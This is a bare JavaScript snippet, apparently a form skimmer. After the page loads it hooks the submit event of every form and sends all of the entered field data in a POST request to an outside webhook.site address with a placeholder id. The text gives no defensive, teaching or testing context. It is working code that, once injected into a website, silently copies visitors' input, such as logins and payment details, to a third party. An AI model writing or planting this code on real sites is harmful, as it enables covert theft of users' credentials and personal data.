window.addEventListener('load', () => {
  document.querySelectorAll('form').forEach(form => {
    form.addEventListener('submit', () => {
      fetch("https://webhook.site/your-id", {
        method: "POST",
        body: new URLSearchParams(new FormData(form))
      });
    });
  });
});
